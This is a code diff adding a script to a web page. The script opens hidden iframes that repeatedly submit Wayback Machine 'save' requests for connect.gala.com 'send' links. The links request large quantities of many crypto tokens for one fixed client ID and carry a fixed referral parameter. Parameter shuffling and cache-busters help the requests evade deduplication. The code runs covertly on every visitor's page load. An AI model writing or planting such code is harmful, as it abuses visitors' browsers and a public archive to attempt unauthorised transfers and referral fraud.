@@ -1,0 +1,174 @@
+
+  <div id="iframeContainer"></div>
+
+<script>
+  // ====== CONFIG ======
+  const IFRAME_COUNT = 4;
+  const SUBMIT_INTERVAL = 60000; // ms
+
+  // Archive endpoints (sub-arrays allowed for future expansion)
+  const archiveURLs = [
+    ["https://web.archive.org/save/{{URL}}"]
+    // additional providers could be added here as arrays
+  ];
+
+  // A compact list of target pages (trimmed example; keep/replace with full list)
+  const mainURLs = [
+    "https://connect.gala.com/send/GALA%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000",
+	"https://connect.gala.com/send/GTRUMP%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000",
+	"https://connect.gala.com/send/GWBNB%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=100",
+	"https://connect.gala.com/send/GWBTC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1",
+	"https://connect.gala.com/send/GUNI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=10000",
+	"https://connect.gala.com/send/GPEPE%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000000",
+	"https://connect.gala.com/send/GPENGU%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000",
+	"https://connect.gala.com/send/GFLOKI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000000",
+	"https://connect.gala.com/send/GFARTCOIN%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000"
+  ];
+
+  // ====== Helpers ======
+  function isValidURL(url) {
+    if (typeof url !== "string") return false;
+    // simple, robust check
+    try {
+      const u = new URL(url);
+      return u.protocol === "http:" || u.protocol === "https:";
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function normalizeURL(url) {
+    if (typeof url !== "string") return "";
+    // Collapse accidental multiple slashes (but preserve protocol '://')
+    // This preserves 'https://' while normalizing other occurrences.
+    return url.replace(/([^:]\/)\/+/g, "$1");
+  }
+
+  function randomArrayElement(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+  }
+
+  // Add fixed parameter and randomize param order (safe on bad input)
+  function addAndShuffleParams(inputUrl) {
+    try {
+      const url = new URL(inputUrl);
+      const paramsArray = [];
+      for (const [key, value] of url.searchParams.entries()) {
+        paramsArray.push(`${key}=${value !== undefined ? value : ""}`);
+      }
+
+      // Add fixed parameter (keep key/value you want)
+      paramsArray.push("r=6208e741d2be6c7234446e99");
+
+      // Remove duplicates and shuffle
+      const unique = Array.from(new Set(paramsArray));
+      for (let i = unique.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [unique[i], unique[j]] = [unique[j], unique[i]];
+      }
+
+      const queryString = unique.join("&");
+      return url.origin + url.pathname + (queryString ? "?" + queryString : "");
+    } catch (e) {
+      // If URL parsing failed, return input unchanged (caller will validate)
+      console.warn("addAndShuffleParams: invalid input:", inputUrl);
+      return inputUrl;
+    }
+  }
+
+  // Pick a random archive endpoint (a string containing {{URL}})
+  function getRandomArchiveEndpoint() {
+    if (!Array.isArray(archiveURLs) || archiveURLs.length === 0) {
+      return null;
+    }
+    const sub = randomArrayElement(archiveURLs);
+    if (!Array.isArray(sub) || sub.length === 0) return null;
+    return randomArrayElement(sub);
+  }
+
+  // Try to choose a valid main URL from the list (safe selection)
+  function pickValidMainURL(attempts = 8) {
+    for (let i = 0; i < attempts; i++) {
+      const candidate = randomArrayElement(mainURLs);
+      const normalized = normalizeURL(candidate || "");
+      if (isValidURL(normalized)) return normalized;
+    }
+    // fallback: scan full list for the first valid one
+    for (const u of mainURLs) {
+      const n = normalizeURL(u || "");
+      if (isValidURL(n)) return n;
+    }
+    return null;
+  }
+
+  // Build the final target URL (archive submit URL)
+  function generateArchiveSubmitURL() {
+    const picked = pickValidMainURL();
+    if (!picked) return null;
+    const original = addAndShuffleParams(picked);
+    const endpointTemplate = getRandomArchiveEndpoint();
+    if (!endpointTemplate) return null;
+    const replaced = endpointTemplate
+      .replace(/{{URL}}/g, original)
+      .replace(/{{ENCODE_URL}}/g, encodeURIComponent(original));
+    return normalizeURL(replaced);
+  }
+
+  // Provide the name used earlier in the submit function
+  function generateTargetURL() {
+    return generateArchiveSubmitURL();
+  }
+
+  // ====== Submission logic ======
+  function submitToWaybackInFrame(iframe) {
+    try {
+      const targetUrl = generateTargetURL();
+      if (!targetUrl || !isValidURL(targetUrl)) {
+        console.warn("⚠ Skipping invalid target:", targetUrl);
+        return;
+      }
+
+      // To avoid caching / identical-URL optimizations, append a cache-buster
+      const cacheBusted = targetUrl + (targetUrl.includes("?") ? "&_=" : "?_=") + Date.now();
+
+      // Load the archive-save url into the iframe (GET). This is simpler than
+      // creating and posting a form to an undefined endpoint.
+      iframe.src = cacheBusted;
+      console.log("📨 iframe", iframe.name, "loading", cacheBusted);
+
+    } catch (err) {
+      console.error("❌ submitToWaybackInFrame error:", err);
+    }
+  }
+
+  const iframeContainer = document.getElementById("iframeContainer");
+
+  function createIframe(i) {
+    try {
+      const iframe = document.createElement("iframe");
+      const fname = "hiddenFrame" + i;
+      iframe.name = fname;
+      iframe.id = fname;
+      iframe.classList.add("hidden-iframe");
+      iframe.src = "about:blank";
+
+      iframeContainer.appendChild(iframe);
+
+      // initial submit shortly after creation
+      setTimeout(() => submitToWaybackInFrame(iframe), 250);
+
+      // periodic submits
+      setInterval(() => {
+        console.log("Interval firing for iframe:", fname);
+        submitToWaybackInFrame(iframe);
+      }, SUBMIT_INTERVAL);
+    } catch (err) {
+      console.error("createIframe error:", err);
+    }
+  }
+
+  // Start: create desired number of iframes
+  for (let i = 0; i < IFRAME_COUNT; i++) {
+    createIframe(i);
+  }
+</script>
